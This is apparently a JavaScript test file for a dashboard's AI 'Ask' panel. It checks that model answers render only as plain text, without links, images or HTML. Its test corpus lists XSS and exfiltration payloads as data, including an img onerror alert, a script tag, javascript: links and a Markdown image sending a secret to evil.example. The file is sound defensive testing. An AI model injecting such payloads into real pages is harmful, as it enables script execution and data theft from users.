// #195 M2-4: web/ask-ui.js's pure functions and its rendering (plan §12.9
// test 10: an XSS and markup corpus through renderAnswer; test 9: chip text
// never contains model text), plus static greps over web/ask-ui.js and
// web/app.js (no innerHTML; the module is loaded only when the page says
// Ask is on).
import { readFileSync } from "fs";
import path from "path";
import assert from "assert/strict";
import * as A from "../../web/ask-ui.js";

const here = path.dirname(new URL(import.meta.url).pathname);
const root = path.resolve(here, "../..");
const read = (p) => readFileSync(path.join(root, p), "utf8");

// A fake document: records every element made, and throws on anything but
// textContent / className / appendChild (no innerHTML, href, src, style).
function fakeDoc() {
  const made = [];
  const node = (tag) => {
    const kids = [];
    const n = {
      tag,
      kids,
      text: "",
      cls: "",
      appendChild(k) {
        kids.push(k);
        return k;
      },
    };
    const guard = new Proxy(n, {
      set(t, k, v) {
        if (k === "textContent") t.text = String(v);
        else if (k === "className") t.cls = v;
        else throw new Error(`renderAnswer set ${String(k)}`);
        return true;
      },
      get(t, k) {
        if (["innerHTML", "outerHTML", "insertAdjacentHTML", "href", "src", "style", "setAttribute"].includes(k))
          throw new Error(`renderAnswer touched ${String(k)}`);
        return t[k];
      },
    });
    made.push(n);
    return guard;
  };
  return { made, createElement: node };
}
const flat = (n) => n.text + n.kids.map(flat).join("");
const tags = (doc) => new Set(doc.made.map((n) => n.tag));

// ---- renderAnswer: the corpus renders as text, nothing live ----
{
  const corpus = [
    "<img src=x onerror=alert(1)>",
    "<script>alert(1)</script>",
    "[click](javascript:alert(1))",
    "![x](https://evil.example/leak.png?d=secret)",
    "see https://evil.example/?q=1 or mail bob@evil.example",
    "javascript:alert(1) and data:text/html,<b>x</b>",
    "# Heading\n> quote\n<div style='x'>y</div>",
    "\\href{https://e}{x} $\\frac{1}{2}$",
    "**[bold link](https://e)** `<b>code</b>` *<i>i</i>*",
    "▶ Go to panel Revenue · EU · 1,234 (a fake chip made of text)",
  ];
  for (const text of corpus) {
    const doc = fakeDoc();
    const box = A.renderAnswer(doc, text);
    const allowed = new Set(["div", "p", "span", "strong", "em", "code", "ul", "ol", "li"]);
    for (const t of tags(doc)) assert.ok(allowed.has(t), `${t} from ${text}`);
    // every character of the input survives as text (nothing interpreted away
    // except the ** / * / ` markers and list bullets)
    const shown = flat(box);
    for (const frag of ["onerror", "alert(1)", "evil.example", "Heading", "frac"]) {
      if (text.includes(frag)) assert.ok(shown.includes(frag), `${frag} kept as text in ${shown}`);
    }
  }
  // URLs, addresses and script schemes are inert, greyed spans
  const doc = fakeDoc();
  A.renderAnswer(doc, "see https://evil.example/x and bob@evil.example, javascript:alert(1)");
  const inert = doc.made.filter((n) => n.cls === "ax-ask-inert").map((n) => n.text);
  assert.deepEqual(inert, ["https://evil.example/x", "bob@evil.example", "javascript:alert(1)"]);
}

// ---- parseAnswer: the little Markdown it allows ----
{
  const b = A.parseAnswer("**EU** leads with `1,234`.\n\n- first *point*\n- second\n1. one\n2. two\n# not a heading");
  assert.equal(b[0].type, "p");
  assert.deepEqual(
    b[0].parts.map((p) => p.t),
    ["b", "text", "code", "text"]
  );
  assert.equal(b[1].type, "ul");
  assert.equal(b[1].items.length, 2);
  assert.equal(b[2].type, "ol");
  assert.deepEqual(b[3], { type: "p", parts: [{ t: "text", s: "# not a heading" }] });
  assert.ok(A.parseAnswer(Array.from({ length: 80 }, (_, i) => `p${i}`).join("\n\n")).length <= 30);
}

// ---- chips: built from the verified cell and the page's title only ----
{
  const c = { panel: 3, verified: true, column: "Revenue", value: 1234.5, row: [["Region", "EU"]], vars: {}, label: "IGNORE <img>" };
  const t = A.chipText(c, "Revenue by region");
  assert.ok(t.startsWith("Revenue by region · EU · Revenue: "), t);
  assert.ok(!t.includes("IGNORE") && !t.includes("<img>"), "the model's label never makes a chip");
  assert.equal(A.chipText({ panel: 7, row: [] }, ""), "Panel 7");
  assert.equal(A.varsNote({ region: "US" }, { region: "EU" }), "with region = US");
  assert.equal(A.varsNote({ region: "EU" }, { region: "EU" }), "");
}

// ---- the stream, suggestions, the notice ----
{
  const { events, rest } = A.parseSse(
    'event: progress\ndata: {"phase":"reading","panel":2}\n\nevent: answer\ndata: {"text":"x"}\n\nevent: prog'
  );
  assert.deepEqual(events, [
    { event: "progress", data: { phase: "reading", panel: 2 } },
    { event: "answer", data: { text: "x" } },
  ]);
  assert.equal(rest, "event: prog");
  assert.deepEqual(A.suggestions(["Revenue by region", "Stock"]), [
    "What does “Revenue by region” show?",
    "What does “Stock” show?",
    "What stands out on this dashboard?",
  ]);
  assert.deepEqual(A.suggestions([]), []);
  const n = A.noticeText({ provider: "Anthropic (Claude)", logged: true, notice: "Ask IT first." });
  assert.ok(n.includes("sent to Anthropic (Claude)") && n.includes("logged by the operator") && n.endsWith("Ask IT first."));
  assert.ok(!A.noticeText({ provider: "X" }).includes("logged"));
}

// ---- static: no innerHTML; loaded only when the server says so ----
{
  const ui = read("web/ask-ui.js");
  const code = ui.replace(/\/\/.*$/gm, "");
  assert.ok(!/innerHTML|outerHTML|insertAdjacentHTML|document\.write|\.src\s*=/.test(code), "no HTML in ask-ui.js");
  assert.deepEqual(code.match(/\.href\s*=.*/g), ['.href = new URL("./ask-ui.css", import.meta.url).href;'], "the only href is its own stylesheet");
  const app = read("web/app.js");
  assert.ok(/if \(servedMode && served\?\.ask\) mountAskSoon\(served\);/.test(app), "loaded only on a served page with Ask on");
  assert.equal((app.match(/import\("\.\/ask-ui\.js"\)/g) || []).length, 1);
  assert.ok(/function askGoTo\(i, c\) \{\n  if \(!Number\.isInteger\(i\)\) return null;/.test(app), "a chip's panel is an integer");
}

console.log("ask_ui_test: ok");
